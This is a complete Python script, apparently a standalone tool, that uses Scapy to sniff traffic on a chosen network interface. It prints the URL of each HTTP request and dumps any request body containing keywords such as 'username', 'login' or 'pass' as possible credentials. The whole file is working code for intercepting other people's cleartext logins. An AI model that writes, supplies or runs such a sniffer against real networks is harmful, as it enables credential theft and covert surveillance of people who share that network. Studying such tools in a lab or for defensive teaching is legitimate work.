#!/usr/bin/env python

"""
This script sniffs network packets on a specified interface and extracts the URL of HTTP requests
as well as possible login information. It uses the Scapy library for packet sniffing and parsing.

Usage: python packet_sniffer.py -i <interface>

Options:
  -i, --interface   The network interface to sniff packets on.
"""

import argparse
import urllib.parse

from scapy.layers import http
from scapy.sendrecv import sniff


def sniff_packets(interface):
    try:
        # Sniff network packets on the specified interface and call process_sniffed_packets for each packet
        print(f"Sniffing packets on interface: {interface}")
        sniff(iface=interface, store=False, prn=process_sniffed_packets)
    except OSError:
        # Handle the case where the specified interface does not exist
        print("Interface does not exist")


def get_url(packet):
    # Extract the URL from an HTTP request packet
    url = (packet[http.HTTPRequest].Host.decode("utf-8", errors="ignore") +
           packet[http.HTTPRequest].Path.decode("utf-8", errors="ignore"))
    # Decode and unquote the URL to a human-readable format
    url = urllib.parse.unquote(url)
    return url


def get_login_info(packet):
    try:
        # Extract and decode the payload from an HTTP packet
        load = packet[http.Raw].load.decode("utf-8", errors="ignore")
        load = urllib.parse.unquote(load)
        keywords = ["username", "uname", "login", "pass"]
        for keyword in keywords:
            if keyword.lower() in load.lower():
                return load  # Return the payload if a keyword is found
    except UnicodeDecodeError:
        # Handle the case where payload decoding fails
        print("Unable to decode payload")


def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        # Extract and print the URL of the HTTP request
        url = get_url(packet)
        print("[+] HTTP Request >>> " + url)
        if packet.haslayer(http.Raw):
            # Extract and print possible login information if found
            login_info = get_login_info(packet)
            if login_info is not None:
                print("\n\nPossible username/password >>> " + login_info + "\n\n")


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface for sniffing")
    options = parser.parse_args()
    interface = options.interface
    return interface


# Get the specified network interface from command-line arguments
interface = get_arguments()
# Start packet sniffing on the specified interface
sniff_packets(interface)
